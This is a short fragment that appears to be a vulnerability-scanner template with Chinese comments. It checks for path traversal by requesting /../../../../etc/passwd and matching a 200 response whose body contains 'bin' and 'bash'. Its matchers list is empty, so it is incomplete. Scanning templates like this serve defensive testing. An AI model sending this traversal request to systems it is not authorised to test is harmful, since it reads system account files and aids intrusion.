http:
- raw:
  - 'GET /../../../../etc/passwd HTTP/1.1


    Accept-Encoding: gzip, deflate


    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8


    Connection: close


    # 响应代码特征

    200


    # 响应内容特征

    ^(?=.*?bin)(?=.*?bash).*?$


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
